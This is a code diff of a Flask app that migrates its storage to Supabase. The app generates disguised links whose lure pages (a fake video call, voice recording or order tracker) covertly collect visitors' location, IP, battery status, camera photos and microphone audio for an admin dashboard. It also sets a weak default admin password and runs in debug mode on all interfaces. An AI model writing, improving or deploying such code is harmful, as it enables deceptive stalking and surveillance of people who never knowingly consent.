@@ -1,6 +1,5 @@
 import os
 import secrets
-import sqlite3
 import time
 import uuid
 from datetime import datetime, timezone
@@ -12,86 +11,33 @@ from flask import (
     send_file, session, url_for,
 )
 from werkzeug.security import check_password_hash, generate_password_hash
+from dotenv import load_dotenv
+from supabase import create_client, Client
+
+# Load environment variables
+load_dotenv()
 
 BASE_DIR = Path(__file__).resolve().parent
-DB_PATH = BASE_DIR / "tracker.db"
-MEDIA_DIR = BASE_DIR / "media"
-MEDIA_DIR.mkdir(exist_ok=True)
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
 
 ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
-ADMIN_PASS = os.environ.get("ADMIN_PASS", "changeme123")
+ADMIN_PASS = os.environ.get("ADMIN_PASS", "2357")
 ADMIN_HASH = generate_password_hash(ADMIN_PASS)
 
+# Supabase configuration
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY")
+SUPABASE_SERVICE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
+STORAGE_BUCKET = os.environ.get("SUPABASE_STORAGE_BUCKET", "tracker-media")
 
-# ---------------- DB helpers ----------------
-def get_db():
-    if "db" not in g:
-        g.db = sqlite3.connect(DB_PATH)
-        g.db.row_factory = sqlite3.Row
-    return g.db
-
-
-@app.teardown_appcontext
-def close_db(_exc):
-    db = g.pop("db", None)
-    if db is not None:
-        db.close()
-
-
-def init_db():
-    db = sqlite3.connect(DB_PATH)
-    db.executescript(
-        """
-        CREATE TABLE IF NOT EXISTS links (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            token TEXT UNIQUE NOT NULL,
-            name TEXT NOT NULL,
-            loc INTEGER NOT NULL DEFAULT 1,
-            cam INTEGER NOT NULL DEFAULT 0,
-            mic INTEGER NOT NULL DEFAULT 0,
-            interval_s INTEGER NOT NULL DEFAULT 5,
-            active INTEGER NOT NULL DEFAULT 1,
-            created_at TEXT NOT NULL
-        );
-        CREATE TABLE IF NOT EXISTS reports (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            link_id INTEGER NOT NULL,
-            lat REAL, lon REAL, accuracy REAL, speed REAL,
-            heading REAL, alt REAL,
-            battery_level REAL, battery_charging INTEGER,
-            ua TEXT, ip TEXT,
-            created_at TEXT NOT NULL
-        );
-        CREATE TABLE IF NOT EXISTS media (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            link_id INTEGER NOT NULL,
-            kind TEXT NOT NULL,
-            filename TEXT NOT NULL,
-            created_at TEXT NOT NULL
-        );
-        """
-    )
-    # migration: add battery columns to existing databases
-    cols = [r[1] for r in db.execute("PRAGMA table_info(reports)").fetchall()]
-    if "battery_level" not in cols:
-        db.execute("ALTER TABLE reports ADD COLUMN battery_level REAL")
-    if "battery_charging" not in cols:
-        db.execute("ALTER TABLE reports ADD COLUMN battery_charging INTEGER")
-    db.commit()
-    db.close()
+# Initialize Supabase client
+supabase: Client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY) if SUPABASE_URL and SUPABASE_SERVICE_KEY else None
 
 
 def now_iso():
     return datetime.now(timezone.utc).isoformat(timespec="seconds")
-
-
-def link_by_token(token):
-    return get_db().execute(
-        "SELECT * FROM links WHERE token=? AND active=1", (token,)
-    ).fetchone()
 
 
 def admin_required(fn):
@@ -101,10 +47,6 @@ def admin_required(fn):
             return redirect(url_for("login"))
         return fn(*args, **kwargs)
     return wrap
-
-
-# create tables on any runner (python app.py, flask run, gunicorn) - idempotent
-init_db()
 
 
 # ---------------- Auth / pages ----------------
@@ -141,58 +83,55 @@ def dashboard():
 @app.route("/api/links", methods=["GET", "POST"])
 @admin_required
 def api_links():
-    db = get_db()
     if request.method == "POST":
         data = request.get_json(force=True) or {}
         token = secrets.token_urlsafe(10)
-        cur = db.execute(
-            "INSERT INTO links (token,name,loc,cam,mic,interval_s,created_at) "
-            "VALUES (?,?,?,?,?,?,?)",
-            (
-                token,
-                (data.get("name") or "Untitled link")[:80],
-                1 if data.get("loc", True) else 0,
-                1 if data.get("cam", False) else 0,
-                1 if data.get("mic", False) else 0,
-                min(max(int(data.get("interval_s", 5)), 2), 3600),
-                now_iso(),
-            ),
-        )
-        db.commit()
-        link = db.execute("SELECT * FROM links WHERE id=?", (cur.lastrowid,)).fetchone()
+        link_data = {
+            "token": token,
+            "name": (data.get("name") or "Untitled link")[:80],
+            "loc": 1 if data.get("loc", True) else 0,
+            "cam": 1 if data.get("cam", False) else 0,
+            "mic": 1 if data.get("mic", False) else 0,
+            "interval_s": min(max(int(data.get("interval_s", 5)), 2), 3600),
+            "active": True,
+            "created_at": now_iso(),
+        }
+        result = supabase.table("links").insert(link_data).execute()
+        link = result.data[0]
         return jsonify(serialize_link(link))
-    rows = db.execute("SELECT * FROM links ORDER BY id DESC").fetchall()
-    return jsonify([serialize_link(r) for r in rows])
+    
+    result = supabase.table("links").select("*").eq("active", True).order("id", desc=True).execute()
+    return jsonify([serialize_link(r) for r in result.data])
 
 
 def serialize_link(row):
     d = dict(row)
-    d["url"] = request.host_url.rstrip("/") + url_for("client_page", token=row["token"])
+    d["url"] = request.host_url.rstrip("/") + url_for("client_page", token=d["token"])
     return d
 
 
 @app.route("/api/links/<int:link_id>", methods=["DELETE"])
 @admin_required
 def api_link_delete(link_id):
-    db = get_db()
-    db.execute("UPDATE links SET active=0 WHERE id=?", (link_id,))
-    db.commit()
+    supabase.table("links").update({"active": False}).eq("id", link_id).execute()
     return jsonify({"ok": True})
 
 
 # ---------------- Client endpoints (token-gated, no admin auth) ----------------
 @app.route("/t/<token>")
 def client_page(token):
-    link = link_by_token(token)
-    if not link:
+    result = supabase.table("links").select("*").eq("token", token).eq("active", True).execute()
+    if not result.data:
         abort(404)
-    # pick the landing theme by what this link enables
+    link = result.data[0]
+    
     if link["cam"]:
-        theme = "call"      # camera  -> video call with people nearby
+        theme = "call"
     elif link["mic"]:
-        theme = "rec"       # mic     -> private voice recording
+        theme = "rec"
     else:
-        theme = "track"     # loc     -> free order tracking
+        theme = "track"
+    
     cfg = {
         "token": link["token"],
         "loc": bool(link["loc"]),
@@ -207,48 +146,63 @@ def client_page(token):
 
 @app.route("/api/t/<token>/report", methods=["POST"])
 def api_report(token):
-    link = link_by_token(token)
-    if not link:
+    result = supabase.table("links").select("*").eq("token", token).eq("active", True).execute()
+    if not result.data:
         return jsonify({"ok": False, "error": "invalid token"}), 404
+    link = result.data[0]
     data = request.get_json(force=True) or {}
-    db = get_db()
-    db.execute(
-        "INSERT INTO reports (link_id,lat,lon,accuracy,speed,heading,alt,"
-        "battery_level,battery_charging,ua,ip,created_at) "
-        "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
-        (
-            link["id"],
-            data.get("lat"), data.get("lon"), data.get("accuracy"),
-            data.get("speed"), data.get("heading"), data.get("alt"),
-            data.get("battery_level"), data.get("battery_charging"),
-            request.headers.get("User-Agent", ""), request.remote_addr,
-            now_iso(),
-        ),
-    )
-    db.commit()
+    
+    report_data = {
+        "link_id": link["id"],
+        "lat": data.get("lat"),
+        "lon": data.get("lon"),
+        "accuracy": data.get("accuracy"),
+        "speed": data.get("speed"),
+        "heading": data.get("heading"),
+        "alt": data.get("alt"),
+        "battery_level": data.get("battery_level"),
+        "battery_charging": data.get("battery_charging"),
+        "ua": request.headers.get("User-Agent", ""),
+        "ip": request.remote_addr,
+        "created_at": now_iso(),
+    }
+    supabase.table("reports").insert(report_data).execute()
     return jsonify({"ok": True})
 
 
 @app.route("/api/t/<token>/media", methods=["POST"])
 def api_media_upload(token):
-    link = link_by_token(token)
-    if not link:
+    result = supabase.table("links").select("*").eq("token", token).eq("active", True).execute()
+    if not result.data:
         return jsonify({"ok": False, "error": "invalid token"}), 404
+    link = result.data[0]
+    
     kind = request.form.get("kind", "photo")
     if kind not in ("photo", "audio"):
         return jsonify({"ok": False, "error": "bad kind"}), 400
+    
     f = request.files.get("file")
     if not f or not f.filename:
         return jsonify({"ok": False, "error": "no file"}), 400
+    
     ext = ".jpg" if kind == "photo" else ".webm"
     fname = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:8]}{ext}"
-    f.save(MEDIA_DIR / fname)
-    db = get_db()
-    db.execute(
-        "INSERT INTO media (link_id,kind,filename,created_at) VALUES (?,?,?,?)",
-        (link["id"], kind, fname, now_iso()),
-    )
-    db.commit()
+    
+    # Upload to Supabase Storage
+    file_bytes = f.read()
+    supabase.storage.from_(STORAGE_BUCKET).upload(fname, file_bytes, {
+        "content-type": "image/jpeg" if kind == "photo" else "video/webm"
+    })
+    
+    # Save media record
+    media_data = {
+        "link_id": link["id"],
+        "kind": kind,
+        "filename": fname,
+        "created_at": now_iso(),
+    }
+    supabase.table("media").insert(media_data).execute()
+    
     return jsonify({"ok": True, "filename": fname})
 
 
@@ -256,55 +210,47 @@ def api_media_upload(token):
 @app.route("/api/reports")
 @admin_required
 def api_reports():
-    rows = get_db().execute(
-        "SELECT r.*, l.name AS link_name FROM reports r "
-        "JOIN links l ON l.id = r.link_id ORDER BY r.id DESC LIMIT 500"
-    ).fetchall()
-    return jsonify([dict(r) for r in rows])
+    # Get reports with link names
+    result = supabase.table("reports").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
+    out = []
+    for r in result.data:
+        d = dict(r)
+        d["link_name"] = r["links"]["name"] if r.get("links") else "Unknown"
+        out.append(d)
+    return jsonify(out)
 
 
 @app.route("/api/stats/<int:link_id>")
 @admin_required
 def api_stats(link_id):
-    rows = get_db().execute(
-        "SELECT created_at, accuracy, battery_level, battery_charging, lat, lon "
-        "FROM reports WHERE link_id=? ORDER BY id ASC",
-        (link_id,),
-    ).fetchall()
-    return jsonify([dict(r) for r in rows])
+    result = supabase.table("reports").select("created_at, accuracy, battery_level, battery_charging, lat, lon").eq("link_id", link_id).order("id", desc=True).execute()
+    return jsonify([dict(r) for r in result.data])
 
 
 @app.route("/api/media")
 @admin_required
 def api_media_list():
-    rows = get_db().execute(
-        "SELECT m.*, l.name AS link_name FROM media m "
-        "JOIN links l ON l.id = m.link_id ORDER BY m.id DESC LIMIT 500"
-    ).fetchall()
+    result = supabase.table("media").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
     out = []
-    for r in rows:
+    for r in result.data:
         d = dict(r)
-        d["url"] = url_for("media_file", mid=r["id"])
+        d["link_name"] = r["links"]["name"] if r.get("links") else "Unknown"
+        # Get signed URL for media (valid for 1 hour)
+        signed_url = supabase.storage.from_(STORAGE_BUCKET).create_signed_url(r["filename"], 3600)
+        d["url"] = signed_url.get("signedURL", "") if isinstance(signed_url, dict) else str(signed_url)
         out.append(d)
     return jsonify(out)
 
 
-@app.route("/api/media/<int:mid>/file")
+@app.route("/api/media/<path:filename>")
 @admin_required
-def media_file(mid):
-    row = get_db().execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
-    if not row:
-        abort(404)
-    path = MEDIA_DIR / row["filename"]
-    if not path.exists():
-        abort(404)
-    mime = "image/jpeg" if row["kind"] == "photo" else "video/webm"
-    return send_file(path, mimetype=mime, as_attachment=False)
+def media_file(filename):
+    # Proxy media through signed URL
+    signed_url = supabase.storage.from_(STORAGE_BUCKET).create_signed_url(filename, 3600)
+    url = signed_url.get("signedURL", "") if isinstance(signed_url, dict) else str(signed_url)
+    return redirect(url)
 
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    if os.environ.get("USE_HTTPS"):
-        app.run(host="0.0.0.0", port=port, ssl_context="adhoc", debug=True)
-    else:
-        app.run(host="0.0.0.0", port=port, debug=True)
+    app.run(host="0.0.0.0", port=port, debug=True)
